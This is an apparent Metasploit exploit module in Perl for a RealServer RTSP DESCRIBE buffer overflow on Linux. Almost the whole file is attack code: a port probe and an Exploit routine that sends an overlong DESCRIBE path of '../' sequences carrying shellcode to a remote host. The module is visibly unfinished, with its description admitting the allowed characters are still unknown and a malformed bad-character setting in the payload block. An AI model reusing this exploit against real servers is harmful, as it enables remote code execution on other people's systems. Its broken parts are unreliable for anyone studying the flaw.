package Msf::Exploit::realserver_describe_linux;
use base "Msf::Exploit";
use strict;

my $advanced = { };

my $info =
{
    'Name'  => 'RealServer Describe Buffer Overflow',
    'Version'  => '1.0',
    'Author'  => 'H D Mooore <hdm[at]metasploit.com> [Artistic License]',
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'linux' ],
    'Priv'  => 1,
    'UserOpts'  => {
                    'RHOST' => [1, 'ADDR', 'The target address'],
                    'RPORT' => [1, 'PORT', 'The RTSP port', 554],
                   },
                
    'Payload' => {
                    'Space'      => 3000,
                    'BadChars'  => "",
                    "\x00\x07\x09\x27\x0a\x0d\xff\xfe\xfd".
                    "%()+,/*:;<=>?\@{|}~.\\/ ^!#&*()=\"'_]\$"
                    ,
                 },
    
    'Description'  =>  "Still trying to figure char combo thats allowed",
                
    'Refs'  =>  [  
                    
                ],
    'Targets' => [ 
                    ['Default Universal Target'], 
                ],
    
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $s = Msf::Socket->new();

    if (! $s->tcp($target_host, $target_port))
    {
        $self->PrintLine("[*] Error: " .$s->get_error());
        return(0);
    }
    $s->send("OPTIONS / RTSP/1.0\r\n\r\n");
    my $res = $s->recv(5);
    
    print $res;
    return(1);
}


sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $shellcode   =$self->GetVar('EncodedPayload')->Payload;

    my $req = "DESCRIBE /". ("../" x 560)  .$shellcode. ".smi RTSP/1.0\r\n\r\n";  
    $req .= ("\x00" x (2000 - length($req)));
    
    my $s = Msf::Socket->new();

    if (! $s->tcp($target_host, $target_port, $self->GetVar('CPORT')))
    {
        $self->PrintLine("[*] ". $s->get_error());
        exit(0);
    }
    print $req;
    $s->send($req);
    sleep(1);
}


1;
